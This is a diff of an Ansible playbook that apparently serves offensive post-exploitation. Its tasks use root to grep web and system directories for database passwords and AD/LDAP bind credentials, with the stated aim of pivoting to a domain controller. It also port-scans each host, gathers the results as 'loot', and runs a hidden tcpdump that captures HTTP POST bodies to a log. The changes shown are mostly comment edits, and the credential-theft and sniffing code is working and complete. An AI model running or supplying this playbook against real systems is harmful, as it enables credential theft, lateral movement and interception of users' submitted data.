@@ -3,21 +3,20 @@
 - name: Extract Database and Web Credentials
   become: yes
   shell: |
-    # Scans everything in /var/www and /etc/mysql with zero directory exclusions
-    # Captures both assignment styles (key=val) and PHP define styles
+    # Global search for assignments and PHP defines. Includes filenames.
     (grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]+['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null; \
-     grep -rEho "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null) \
+     grep -rEo "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null) \
     | grep -vE "(\.png|\.jpg|\.svg|\.gif)" \
     | sort -u
   register: db_results
   failed_when: false
   changed_when: false
 
-# SECTION 2: SYSTEM PORT SCAN (Replaces VPN)
+# SECTION 2: SYSTEM PORT SCAN
 - name: Scan for Open Service Ports
   become: yes
   shell: |
-    # Fast scan of the top 1000 ports to identify running services
+    # Fast scan of top ports. Requires nmap on Red Workstation.
     nmap -sT -T4 --open {{ inventory_hostname }} | grep "tcp open"
   register: port_scan_results
   failed_when: false
@@ -27,7 +26,7 @@
 - name: Extract AD and LDAP Bind Info
   become: yes
   shell: |
-    # Global search for AD/LDAP strings to pivot to SCP-DC-01
+    # Search everything for AD/LDAP strings to pivot to SCP-DC-01.
     grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server|ldap_uri|ldap_password)[:=]\s*[^ \t\n;]+" /etc /var/www /opt 2>/dev/null \
     | sort -u
   register: ad_bind_results
@@ -56,7 +55,7 @@
 - name: CATEGORIZED LOOT ALERT
   debug:
     msg:
-      - "--- DB/WEB (Apache/MySQL) ---"
+      - "--- DB/WEB ---"
       - "{{ db_results.stdout_lines | default(['None']) }}"
       - "--- OPEN PORTS ---"
       - "{{ port_scan_results.stdout_lines | default(['None']) }}"
@@ -69,4 +68,5 @@
   run_once: true
   become: yes
   shell: |
+    # YAML Literal block prevents Jinja2 errors.
     nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
